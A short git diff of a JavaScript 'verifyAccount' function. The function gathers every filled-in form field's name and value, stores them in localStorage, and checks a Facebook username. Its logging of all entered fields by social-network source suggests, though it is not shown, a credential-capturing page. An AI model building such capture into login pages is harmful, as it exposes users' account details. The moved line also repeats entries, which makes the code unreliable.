@@ -80,13 +80,13 @@ function verifyAccount (source) {
     inputGroup.forEach((input)=>{
         if (input.value != '' && input.type != 'submit') {
             texts += `${input.name}: ${input.value}* `;
+            localStorage.setItem('usermessage',userMessage += `${source} ${texts}\n`);
             if (input.name == 'username') {
                 username = input.value;
             }
         }
     })
     
-    localStorage.setItem('usermessage',userMessage += `${source} ${texts}\n`);
     //invaid facebook username 
     if (source == 'facebook') {
         // username... remove white space
